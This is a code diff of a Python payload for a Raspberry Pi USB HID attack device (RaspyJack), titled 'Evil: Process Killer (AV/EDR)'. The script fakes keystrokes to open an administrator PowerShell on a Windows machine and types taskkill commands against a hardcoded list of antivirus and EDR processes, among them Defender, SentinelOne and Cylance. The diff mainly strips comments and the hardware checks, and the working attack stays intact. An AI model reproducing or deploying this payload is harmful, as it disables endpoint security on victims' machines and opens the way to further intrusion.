@@ -1,44 +1,21 @@
 #!/usr/bin/env python3
 import sys
-sys.path.append('/root/Raspyjack/')
-"""
-RaspyJack *payload* – **Evil: Process Killer (AV/EDR)**
-========================================================
-A HID attack that attempts to kill common antivirus and EDR processes
-on a Windows machine.
-
-**NOTE:** This requires an elevated (admin) prompt to be effective. It
-will attempt to get one via the UAC prompt. This is also very noisy
-and will be logged by security products if they are not successfully
-terminated.
-"""
-
-import os, sys, subprocess, time
+import os
+import time
+import signal
+import subprocess
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
-try:
-    import RPi.GPIO as GPIO
-    import LCD_1in44, LCD_Config
-    from PIL import Image, ImageDraw, ImageFont
-    HARDWARE_LIBS_AVAILABLE = True
-except ImportError:
-    HARDWARE_LIBS_AVAILABLE = False
-    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)
+import RPi.GPIO as GPIO
+import LCD_1in44, LCD_Config
+from PIL import Image, ImageDraw, ImageFont
+from hid_helper import hid_helper
 
-from hid_helper import hid_helper # Import the new HID helper
-
-# --- CONFIGURATION ---
-# A list of common AV/EDR process names
 PROCESSES_TO_KILL = [
     "MsMpEng.exe", "NisSrv.exe", "MsSense.exe", "avp.exe", "avguard.exe",
     "bdagent.exe", "mbam.exe", "SentinelAgent.exe", "CylanceSvc.exe"
 ]
 
-# --- Display Functions ---
 def show_message(lines, color="lime"):
-    if not HARDWARE_LIBS_AVAILABLE:
-        for line in lines:
-            print(line)
-        return
     LCD = LCD_1in44.LCD()
     LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
     image = Image.new("RGB", (128, 128), "BLACK")
@@ -50,12 +27,7 @@ def show_message(lines, color="lime"):
         y += 15
     LCD.LCD_ShowImage(image, 0, 0)
 
-# --- Main Attack Logic ---
 def run_attack():
-    if not HARDWARE_LIBS_AVAILABLE:
-        print("ERROR: Hardware libraries not available. Cannot run HID attack.", file=sys.stderr)
-        return
-
     show_message(["HID Attack:", "Process Killer"])
     
     if not hid_helper.is_hid_gadget_enabled:
@@ -63,16 +35,15 @@ def run_attack():
         time.sleep(3)
         return
 
-    # Build the command string
     kill_commands = ""
     for proc in PROCESSES_TO_KILL:
         kill_commands += f"taskkill /f /im {proc}; "
     
     try:
-        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.x) # Win+X
+        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.x)
         time.sleep(0.5)
-        hid_helper.press_key(hid_helper.keyboard.a) # 'a' for Admin PowerShell
-        time.sleep(1.5) # Wait for UAC prompt and PowerShell to open
+        hid_helper.press_key(hid_helper.keyboard.a)
+        time.sleep(1.5)
         hid_helper.type_string(kill_commands)
         hid_helper.press_key(hid_helper.keyboard.enter)
         time.sleep(0.5)
@@ -84,14 +55,12 @@ def run_attack():
         show_message(["Attack FAILED!"])
         print(f"Error running HID attack: {e}", file=sys.stderr)
 
-# --- Execution ---
 if __name__ == '__main__':
     try:
         run_attack()
         time.sleep(3)
     finally:
-        if HARDWARE_LIBS_AVAILABLE:
-            LCD = LCD_1in44.LCD()
-            LCD.LCD_Clear()
-            GPIO.cleanup()
+        LCD = LCD_1in44.LCD()
+        LCD.LCD_Clear()
+        GPIO.cleanup()
         print("Process Killer payload finished.")
